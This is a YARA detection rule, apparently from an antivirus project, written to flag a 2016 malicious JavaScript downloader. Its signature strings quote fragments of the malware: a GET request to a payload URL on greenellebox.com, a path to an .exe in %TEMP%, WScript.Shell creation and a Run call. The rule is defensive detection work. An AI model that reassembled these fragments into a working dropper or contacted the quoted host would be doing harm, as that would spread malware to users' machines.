rule sig_20160329_e7c65de579c31865c366b64e89c2c283 {
  meta:
    description = "datamaliciousorder - file 20160329_e7c65de579c31865c366b64e89c2c283.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "55837a4bb39044b774333687866b056106beff7174b2a3b79ac85a53c032bc9b"

  strings:
    $s1  = "V[fV](\"GET\", \"http://greenellebox.com/a1odk\", false);" fullword ascii
    $s2  = "function i() {return Uc[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"i8hLNmDD9sioD.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[XC](i0() * 11); if (V[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var Uc = function n() {return WScript[vF](\"WScript.Shell\");}(), Ao = 11;" fullword ascii
    $s5  = "function c(g, f){yG = yG * 1; return g - f;};" fullword ascii
    $s6  = "function D(){return \"\" + sp;};" fullword ascii
    $s7  = "function F() {return ((gR == true) && (gR == w)) ? 1 : yG;};" fullword ascii
    $s8  = "function Y(N0){Uc[\"Run\"](N0, yG, yG);};" fullword ascii
    $s9  = "var d = new this[\"Date\"]();" fullword ascii
    $s10 = " while (PJ){" fullword ascii
    $s11 = "function i0(){return 22;};" fullword ascii
    $s12 = "function wL(b) {var z = (1, 2, 3, 4, 5, b); return z;};" fullword ascii
    $s13 = "function B(){return vF;};" fullword ascii
    $s14 = "return c(z0, a);" fullword ascii
    $s15 = "function jT()" fullword ascii
    $s16 = "var w = false;" fullword ascii
    $s17 = "w = true; " fullword ascii
    $s18 = "gR = true; " fullword ascii
    $s19 = "var eE = false;" fullword ascii
    $s20 = "var gR = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}